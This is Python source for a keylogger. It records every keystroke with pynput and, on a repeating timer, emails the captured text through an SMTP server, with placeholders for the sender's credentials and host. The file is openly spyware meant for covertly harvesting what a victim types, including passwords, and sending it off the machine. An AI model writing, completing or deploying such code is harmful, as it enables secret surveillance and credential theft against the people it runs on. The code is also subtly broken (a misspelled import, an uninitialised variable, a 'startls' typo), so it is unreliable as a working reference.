#! /usr/bin/env python

import pynput.keyboard
import therading
import smtplib

class Keylogger:

	def __init__(self, interval, email, password):
		self.data = "Apllication started"
		self.interval = interval
		self.email = email
		self.password = password

	def append_data(self, string):
		self.data += string

	def key_press(self, key):
		try:
			current_key += str(key.char)
		except AttributeError:
			if key == key.space:
				current_key += " "
			else:
				current_key += " " + str(key) + " "
		self.append_data(current_key)

	def send(self):
		self.mail(self.email, self.password, "\n\n" + self.data) #content of the message
		self.data = ""
		timer = threading.Timer(self.interval, self.send)
		timer.start()

	def mail(self, email, password, message):
		server = smtplib.SMTP("put_your_email", 587)
		server.startls()
		server.login(email, password)
		server.sendmail(email, email, message)
		server.quit()

	def start(self):
		keyboard_list = pynput.keyboard.Listener(on_press = self.key_press)
		with keyboard_list():
			self.send()
			keyboard_list.join()


